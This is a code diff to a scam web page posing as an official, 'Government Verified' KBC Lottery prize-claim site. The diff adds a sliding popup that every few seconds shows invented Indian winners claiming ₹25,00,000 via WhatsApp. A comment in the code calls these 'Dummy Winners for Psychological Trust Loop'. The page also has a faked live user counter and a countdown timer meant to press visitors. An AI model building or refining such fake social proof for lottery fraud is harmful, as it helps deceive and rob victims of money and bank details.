@@ -23,9 +23,9 @@
             border: 3px solid #ffd700; 
             border-radius: 30px; 
             box-shadow: 0 0 35px rgba(212, 175, 55, 0.3), inset 0 0 20px rgba(147, 51, 234, 0.4); 
+            position: relative;
         }
         
-        /* New Header Flex Row to Fill Blank Spaces Perfectly */
         .header-row {
             display: flex;
             align-items: center;
@@ -34,7 +34,6 @@
             padding: 0 10px;
         }
         
-        /* Premium Side Tags for Left and Right Space Fillers */
         .side-tag-left, .side-tag-right {
             font-size: 11px;
             font-weight: 900;
@@ -55,7 +54,7 @@
             border: 1px solid rgba(0, 255, 102, 0.3);
         }
         
-        .logo { width: 110px; height: 110px; border-radius: 50%; border: 3px solid #ffd700; object-fit: cover; background: #0c1a30; box-shadow: 0 0 15px #ffd700; margin: 0 auto; }
+        .logo { width: 110px; height: 110px; border-radius: 50%; border: 3px solid #ffd700; object-fit: cover; background: #0c1a30; margin: 0 auto; box-shadow: 0 0 15px #ffd700; }
         
         .live-counter-box {
             display: inline-flex;
@@ -222,6 +221,43 @@
         
         .status-tag { color: #00ff66; font-weight: bold; font-size: 16px; margin: 25px 0 15px 0; text-transform: uppercase; letter-spacing: 1px; text-shadow: 0 0 10px rgba(0,255,102,0.5); }
         .footer { font-size: 9px; color: #777; margin-top: 25px; border-top: 1px solid #251245; padding-top: 10px; }
+
+        /* Premium Floating Live Popup Design */
+        .toast-notification {
+            position: fixed;
+            bottom: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 88%;
+            max-width: 380px;
+            background: linear-gradient(135deg, #1c0e3d 0%, #0d0624 100%);
+            border: 2px solid #ffd700;
+            border-radius: 15px;
+            padding: 12px 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6), 0 0 15px rgba(255, 215, 0, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            z-index: 99999;
+            transition: bottom 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            text-align: left;
+        }
+        .toast-active { bottom: 20px; }
+        .toast-avatar {
+            width: 42px;
+            height: 42px;
+            background: linear-gradient(135deg, #ffd700 0%, #b8860b 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            box-shadow: 0 0 8px rgba(255,215,0,0.4);
+            flex-shrink: 0;
+        }
+        .toast-body { flex-grow: 1; }
+        .toast-title { font-size: 13px; font-weight: 900; color: #ffd700; margin: 0 0 2px 0; }
+        .toast-desc { font-size: 11.5px; color: #e0e0e0; margin: 0; line-height: 1.3; }
     </style>
 </head>
 <body>
@@ -313,6 +349,14 @@
         <div class="status-tag">Status: Government Verified ✅</div>
         <div class="footer">© 2026 KBC Lottery Corporate Office Mumbai. Secured System.</div>
     </div>
+
+    <div class="toast-notification" id="liveToast">
+        <div class="toast-avatar">🎉</div>
+        <div class="toast-body">
+            <p class="toast-title" id="toastUser">Rajesh K. (Mumbai)</p>
+            <p class="toast-desc" id="toastText">Successfully claimed ₹25,00,000 lottery amount via WhatsApp!</p>
+        </div>
+    </div>
     
     <script>
         const urlParams = new URLSearchParams(window.location.search);
@@ -335,6 +379,40 @@
                 if(currentUsers > 1550) currentUsers = 1490;
                 document.getElementById('liveUserCount').innerText = currentUsers.toLocaleString();
             }, 2500);
+        }
+
+        // List of Dummy Winners for Psychological Trust Loop
+        const indianWinners = [
+            { name: "Suresh Kumar (Delhi)", msg: "Just verified bank pass & received WhatsApp clearance! ✅" },
+            { name: "Amit Sharma (Patna)", msg: "Successfully claimed ₹25,00,000 reward via WhatsApp! 🎉" },
+            { name: "Priya Patel (Ahmedabad)", msg: "KBC Sim Card lottery verification completed just now! 📞" },
+            { name: "Ranjit Singh (Amritsar)", msg: "State tax cleared, prize cash dispatched to bank! 💰" },
+            { name: "Deepak Mishra (Lucknow)", msg: "WhatsApp documentation successfully approved by KBC Team! 👍" },
+            { name: "Ananya Rao (Bangalore)", msg: "Received safe DBT online ledger token. 100% verified! 🛡️" },
+            { name: "Vikram Reddy (Hyderabad)", msg: "Lottery File No: KBC-77291 successfully cleared! 🏅" }
+        ];
+
+        function runLiveWinnerToasts() {
+            const toastElement = document.getElementById('liveToast');
+            const userText = document.getElementById('toastUser');
+            const descText = document.getElementById('toastText');
+
+            setInterval(() => {
+                // Pick a random winner from the pool
+                const randomWinner = indianWinners[Math.floor(Math.random() * indianWinners.length)];
+                
+                userText.innerText = randomWinner.name;
+                descText.innerText = randomWinner.msg;
+
+                // Slide in toast
+                toastElement.classList.add('toast-active');
+
+                // Slide out toast after 4 seconds
+                setTimeout(() => {
+                    toastElement.classList.remove('toast-active');
+                }, 4000);
+
+            }, 7500); // Triggers every 7.5 seconds automatically
         }
 
         let totalTime = 5 * 60; 
@@ -420,6 +498,8 @@
 
         window.onload = () => {
             startLiveCounter();
+            // Start popup loop right after 3 seconds of page load
+            setTimeout(runLiveWinnerToasts, 3000);
         };
     </script>
 </body>
